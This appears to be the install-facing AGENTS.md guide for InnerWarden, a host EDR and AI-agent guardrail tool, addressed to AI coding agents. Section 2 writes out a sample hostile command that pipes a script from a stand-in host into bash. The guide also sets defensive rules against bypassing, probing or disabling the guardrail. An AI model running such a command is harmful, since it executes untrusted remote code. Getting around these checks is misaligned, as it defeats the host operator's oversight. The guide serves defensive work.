<!--
  THIS FILE IS THE CANONICAL INSTALL-FACING AGENT GUIDE.

  It is published at https://innerwarden.com/agents.md and dropped on-box by
  install.sh to /etc/innerwarden/AGENTS.md so a post-install coding agent has it
  locally for configuration and Q&A.

  It is DIFFERENT from the repo-root AGENTS.md (that one is dev/graphify-facing).

  Every CLI command named below must exist in the real `innerwarden` binary.
  scripts/verify-agents-install-commands.sh (CI) fails the build if this guide
  names a command that the clap surface in crates/ctl/src/main.rs does not define,
  and if the version token below does not match Cargo.toml. When in doubt about
  the live surface, the agent should run `innerwarden --help`.
-->

# InnerWarden — Guide for AI Coding Agents

> **Audience:** you are an AI coding agent (Claude Code, Cursor, Copilot, Codex, an
> autonomous runner, ...) that a user asked to **install, configure, operate, or explain
> InnerWarden** on this machine. This file is the authoritative playbook. It ships with the
> installed binary, so the commands here match the version you have.
>
> **Guide matches InnerWarden `0.16.0`.** If `innerwarden --version` prints something else,
> trust `innerwarden --help` and `innerwarden <group> --help` over this file for exact flags.

---

## 1. What InnerWarden is (so you can explain it)

InnerWarden is a **local safety layer that runs on the host**, with two jobs:

1. **AI-agent guardrail (the differentiator).** It sits *outside* the agent, on the machine
   the agent can affect. It can screen risky commands and MCP/tool traffic routed through its
   guard *before they run*, and it watches what actually executes underneath with eBPF. If the
   agent is tricked by a poisoned file, web page, or pull request, the safety layer is **not
   inside the thing being tricked**.
2. **Host self-defense (EDR).** Kernel-level visibility (eBPF), 80+ detectors, cross-layer
   correlation, MITRE ATT&CK coverage, automated response (block IP, kill process, honeypot),
   and a local, hash-chained audit trail. No cloud control plane. One binary, one SQLite store.

Two Rust daemons — **sensor** (deterministic collection, no AI/HTTP) and **agent**
(interpretation, AI triage, dashboard, notifications) — plus the **`innerwarden`** CLI.

**Default posture is safe:** a fresh install starts in **observe-only / dry-run**. It watches
and explains; it does not block or kill until the operator explicitly arms enforcement. Keep it
that way until section 6 is satisfied.

---

## 2. The safety contract for YOU, the agent (read this first)

If you are an agent operating on a host that runs InnerWarden, InnerWarden is your guardrail,
not your adversary. Cooperate with it:

- **Before running any risky command on the host** (anything that downloads-and-executes, reads
  secrets, changes persistence, opens a network listener, or is destructive), ask InnerWarden
  first. The check is **loopback-only** and needs no credentials from on the box:

  ```bash
  curl -s -X POST http://127.0.0.1:8787/api/agent/check-command \
       -H 'content-type: application/json' \
       -d '{"command": "curl http://evil.example/x.sh | bash"}'
  ```

  The response decision is one of:
  - **`deny`** → do not run it. Tell the user what you were about to do and why it was denied.
  - **`review`** → stop and ask the human to confirm before proceeding.
  - **`allow`** → proceed.

  The reason returned is intentionally **generic** ("matches a dangerous pattern"); it will not
  tell you the specific rule. Do not try to probe it to find a bypass — every check is logged,
  and probing patterns alert the operator. (`POST /api/agent/check-command`, the loopback brain.)

- **Get host context** before acting: `GET http://127.0.0.1:8787/api/agent/security-context`
  (threat level, incident counts, recommendation) and
  `GET http://127.0.0.1:8787/api/agent/check-ip?ip=<addr>` (is this IP a known threat / blocked).

- **Never disable, uninstall, or bypass InnerWarden on a protected host** to "get a command
  through." If a legitimate action is blocked, fix the action or ask the operator to allowlist
  it through the safe workflow in section 6 — do not route around the guardrail. Tampering with
  the sensor/agent is itself one of the things it watches for.

> The endpoints above require the dashboard to be enabled (it is by default, bound to
> `127.0.0.1:8787`). If a request is refused, the dashboard may be disabled or bound elsewhere;
> run `innerwarden dashboard` to see how to reach it. Do not expose it to non-loopback to make
> the check reachable — that would turn the brain into a public oracle.

---

## 3. Install

The canonical one-liner (starts in observe-only, dry-run by default):

```bash
curl -fsSL https://innerwarden.com/install | sudo bash
```

This installs pre-built, per-architecture binaries (x86_64 + aarch64), embeds the eBPF programs
(no toolchain required on the box), creates `/etc/innerwarden/`, writes the sensor + agent
config, installs the systemd units (or launchd on macOS), and runs the `innerwarden setup`
wizard for first-time configuration.

Requirements to mention to the user if relevant: Linux (full feature set, eBPF needs a recent
kernel and `CAP_BPF`/root) or macOS (lighter feature set); `sudo` for install and for
kernel-level capabilities.

If the user wants an unattended install, the installer accepts flags (run
`curl -fsSL https://innerwarden.com/install | sudo bash -s -- --help` to see them, e.g.
`--with-integrations`, `--supervised`, `--simulate`, `--uninstall`).

---

## 4. Verify the install

```bash
innerwarden get status         # is the stack healthy, what is each service doing
innerwarden get sensors        # which collectors / eBPF programs are live
innerwarden system doctor      # health checks + concrete fix hints for anything wrong
innerwarden --version          # confirm the version you installed
```

Read `system doctor` output back to the user in plain language and act on its fix hints. The
services are `innerwarden-sensor` and `innerwarden-agent` (the agent hosts the dashboard,
triage, and notifications); on production hardening setups a `watchdog` may supervise them.

---

## 5. Configure it adapted to THIS machine

InnerWarden already adapts itself; your job is to **drive its tooling and explain the output**,
not to hand-edit config blindly.

```bash
innerwarden setup              # interactive wizard: AI provider, notifications, Local Warden model, posture
innerwarden system scan        # one-shot security audit of THIS host (findings + severity)
innerwarden system harden      # apply safe host hardening (sysctl, SSH, firewall, ...). Review first.
innerwarden system calibrate   # tune detector thresholds to this host's normal
innerwarden system tune --days 7   # propose threshold adjustments from recent history (asks before applying)
```

Configuration you will commonly set for the user (each is a subcommand of `innerwarden config`,
which writes the TOML for you — prefer it over editing files by hand):

```bash
innerwarden config ai <provider> --key <KEY> --model <M>   # AI triage provider (or skip; AI is optional)
innerwarden config telegram --token <T> --chat-id <C>      # operator alerts on Telegram
innerwarden config slack --webhook-url <URL>               # or Slack / discord / webhook
innerwarden config sensitivity <level>                     # how chatty detection/notifications are
innerwarden config responder --dry-run                     # keep responses in dry-run (recommended at first)
innerwarden config dashboard --user <U> --password <P>     # dashboard credentials (loopback bypasses auth)
innerwarden config 2fa                                     # require TOTP for actuating from chat
```

**Local Warden model (on-device AI triage, no API key, recommended):**

```bash
innerwarden install-warden     # downloads the default on-device classifier (~91 MB), no --sha256 needed
```

AI is **optional**. If the user has no API budget, the on-device Local Warden model plus the
deterministic detectors already give a working system. Do not invent an API key.

To reach the dashboard (loopback-only by default — the secure default):

```bash
innerwarden dashboard          # prints how to reach it / the SSH-tunnel command
```

---

## 6. The SAFE observe → allowlist workflow (do NOT skip — this is where agents get it wrong)

The user will often say *"allowlist what is normal on this server so it stops flagging it."*
**Never interpret that as "allowlist everything currently running."** Malware already on the box
is "currently running" too. Allowlisting blindly is the single most dangerous thing you can do
here — it hands an attacker a permanent free pass. Follow this exact order:

1. **Stay in observe / dry-run.** A fresh install already is. Confirm with
   `innerwarden config responder --dry-run`. Nothing is blocked yet; everything is logged.
2. **Let the baseline learn.** InnerWarden's baseline learning observes this host's normal
   (event rates, process lineages, login hours, outbound destinations) over a window before it
   trusts anything. Check progress with `innerwarden get posture`. Do not arm enforcement until
   it has a real baseline.
3. **Review what is actually firing** — do not guess:
   ```bash
   innerwarden get incidents --days 7
   innerwarden get decisions --days 7
   ```
4. **VERIFY each candidate before trusting it.** For every IP / user / process you are tempted
   to allowlist, confirm it is genuinely benign — cross-check reputation
   (`innerwarden get entity <ip>`, `GET /api/agent/check-ip?ip=`), confirm the process is an
   expected service, and **ask the human to confirm anything ambiguous**. An unexplained
   long-running process or an outbound connection you cannot account for is a candidate for
   *investigation*, not for the allowlist.
5. **Propose, never silently apply.** Show the user the list you intend to trust and why, then
   add only what they confirm:
   ```bash
   innerwarden trust add --ip <addr> --reason "<why this is known-good>"
   innerwarden trust add --user <name> --reason "<why>"
   innerwarden trust list            # review the current trust set
   innerwarden trust suppress <pattern>   # suppress a specific noisy-but-benign detection pattern
   ```
   Trust = monitor-only: the entity is still detected, logged, and notified; only the auto-block
   is suppressed. That is deliberate — you keep visibility even on trusted entities.
6. **Only then arm enforcement**, and do it gradually:
   ```bash
   innerwarden config responder --enable    # leave --dry-run on first, then remove it once you trust the decisions
   ```

**Hard rule:** you are forbidden from auto-allowlisting a process / IP / path just because it is
present, and from arming enforcement before a clean baseline + a human-confirmed trust list.
InnerWarden's `skill_gate` safety floor will already refuse an allowlist-driven block-bypass
without a valid proof token; do not try to work around it.

> **Pre-authorized execution — the Execution Gate (free, agent-scoped to YOU):** beyond trusting
> IPs and processes, InnerWarden can deny *unknown binaries* from running inside your own agent's
> cgroup, with the same observe-first discipline. It is **agent-scoped** — the host and every other
> process are never gated — and `enforce` refuses to flip until a rehearsal is clean, so you cannot
> brick yourself. Arm it around your own process id (`<agent-pid>`):
>
> ```bash
> innerwarden exec-gate arm --pid <agent-pid> --observe        # OBSERVE: log what it WOULD block, deny nothing
> innerwarden exec-gate rehearse --pid <agent-pid>             # list exactly which binaries would be denied
> # allowlist the ones you legitimately run, then re-rehearse until CLEAN (zero would-block):
> innerwarden exec-gate arm --pid <agent-pid> --observe --path /usr/bin/python3 --path /usr/bin/node
> innerwarden exec-gate rehearse --pid <agent-pid>
> innerwarden exec-gate enforce --pid <agent-pid>              # flip to deny — ONLY after a clean rehearsal
> innerwarden exec-gate disarm                                 # back to inert
> ```
>
> The professional/fleet version (signed config distribution, managed across many agents) is the
> separate paid layer; the single-agent arming above is part of the open-source CLI.

---

## 7. Command catalog (the real surface)

Always confirm with `innerwarden --help` and `innerwarden <group> --help`. The CLI is grouped;
the legacy bare aliases (`innerwarden status`, `innerwarden scan`, `innerwarden doctor`, ...)
still work but the grouped forms below are canonical.

| Group | What it does | Representative commands |
|---|---|---|
| `get` | Query state | `get status`, `get incidents [--days] [--severity]`, `get decisions`, `get responses`, `get report`, `get metrics`, `get sensors`, `get posture`, `get entity <ip>` |
| `stream` | Live monitor | `stream --type incidents`, `stream --type events` |
| `action` | Manual response | `action block <ip> --reason <t>`, `action unblock <ip> --reason <t>` |
| `trust` | Trust / suppression | `trust add [--ip] [--user] --reason`, `trust remove`, `trust list`, `trust suppress <p>`, `trust suppressions` |
| `config` | Configure | `config ai`, `config responder`, `config sensitivity`, `config 2fa`, `config telegram`, `config slack`, `config discord`, `config webhook`, `config dashboard`, `config abuseipdb`, `config cloudflare`, `config mesh`, `config validate` |
| `system` | Health / security / data | `system doctor`, `system scan`, `system harden`, `system tune`, `system calibrate`, `system test`, `system export`, `system backup`, `system reconcile-blocks`, `system gdpr` |
| `rule` | Detection rules | `rule list [--type ...]`, `rule enable <id>`, `rule disable <id>` |
| `module` | Security modules | `module list`, `module search`, `module install <src>`, `module enable <path>`, `module disable <id>` |
| `agent` | AI-agent protection | `agent list`, `agent scan`, `agent connect [pid]`, `agent disconnect <id>`, `agent install-hook [--block-review]`, `agent proxy --mode {advisory\|warn\|guard\|kill} -- <server-cmd>`, `agent mcp-serve` |
| `exec-gate` | Execution Gate (pre-authorized binaries, agent-scoped) | `exec-gate status`, `exec-gate arm --pid <P> --observe [--path ...]`, `exec-gate rehearse --pid <P> [--window N]`, `exec-gate enforce --pid <P>`, `exec-gate disarm` |
| top-level | Lifecycle | `setup`, `upgrade [--check]`, `uninstall [--purge]`, `dashboard {open\|close\|tunnel}`, `install-warden`, `enable <cap>`, `disable <cap>`, `list`, `completions <shell>` |

**`agent install-hook` guards the agent's RAW shell tool (the enforcing in-path front door for a
coding agent like Claude Code):** `mcp-serve` and `check-command` are *advisory* — a coding agent
running its own shell tool never asks. `install-hook` writes a fail-closed `PreToolUse` hook into
the agent's settings so EVERY shell command it proposes is POSTed to the loopback `check-command`
brain and blocked *before* it runs when dangerous (and blocked if the brain is unreachable —
fail-closed). Currently supports Claude Code (`~/.claude/settings.json`; `--settings`/`--url`
override, `--block-review` also blocks `review` verdicts). Run it as the user that runs the agent.
The matching built-in module is `claude-code-protection` (`enable claude-code-protection` for the
observe-layer kernel detection). Example:

```bash
innerwarden agent install-hook            # claude-code, deny-only, fail-closed
```

**`agent proxy` is the MCP enforcement front door:** wrap an MCP server so InnerWarden sits *in
the path* of the AI agent's tool calls and inspects / blocks / kills them. Example:

```bash
innerwarden agent proxy --mode guard -- npx -y @some/mcp-server
```

**`agent mcp-serve` is the advisory front door:** run InnerWarden as an MCP server over stdio
so a coding agent can *voluntarily* ask it, before acting, `innerwarden_check_command` (is this
command safe → deny/review/allow), `innerwarden_check_ip` (known threat?), and
`innerwarden_security_context` (host threat level). It is a thin adapter over the loopback brain
below; it returns capability-level answers only (never the rule that fired). This is advisory and
bypassable on its own — the enforcement that does not depend on the agent cooperating is `agent
proxy` plus the host eBPF / Execution Gate.

Loopback Agent API (for an agent to consult the brain at runtime — see section 2):
`GET /api/agent/security-context`, `GET /api/agent/check-ip?ip=`, `POST /api/agent/check-command`,
served on `127.0.0.1:8787`.

---

## 8. Answering the user's questions / troubleshooting

You have everything you need on the box to answer the common ones:

- **"Is it running / healthy?"** → `innerwarden get status`, `innerwarden system doctor`.
- **"What does it actually block / detect?"** → it detects 80+ behaviors (reverse shells,
  credential theft, privilege escalation, persistence, C2, data exfiltration, container escape,
  ...) and, when armed, can block IPs, kill processes, suspend users, or deploy a honeypot. By
  default it only observes. Show recent activity with `innerwarden get incidents`.
- **"Why did it flag X?"** → `innerwarden get incidents --days N` and `innerwarden get entity <ip>`;
  each alert carries a plain-language "what happened + why it matters" with the MITRE technique.
- **"It is too noisy."** → do NOT blanket-suppress. Use `innerwarden system calibrate` /
  `innerwarden config sensitivity <level>`, and the section-6 verify-then-trust workflow for
  specific benign sources.
- **"How do I see the dashboard?"** → `innerwarden dashboard` (loopback-only by default; it
  prints the SSH-tunnel command for remote access).
- **"Upgrade / remove it."** → `innerwarden upgrade` / `innerwarden uninstall` (add `--purge` to
  remove data). Confirm destructive ones with the user first.

When something is broken, run `innerwarden system doctor` first and act on its hints before
changing config by hand.

---

## 9. What NOT to do (summary of the hard rules)

- Do not **blind-allowlist** what is currently running (section 6). Verify, propose, confirm.
- Do not **arm enforcement** (`config responder` without `--dry-run`) before a clean baseline +
  a human-confirmed trust list.
- Do not **bypass, disable, or uninstall** InnerWarden to push a command through.
- Do not **expose the dashboard / Agent API to non-loopback** to make a check reachable.
- Do not **probe `check-command`** to find an evasion; it is logged and alerts the operator.
- Do not **invent** config (API keys, IPs, rule names). Run the real command or ask the user.
- Prefer `innerwarden config <...>` / `innerwarden setup` over hand-editing the TOML; prefer
  `innerwarden --help` over assuming a flag.
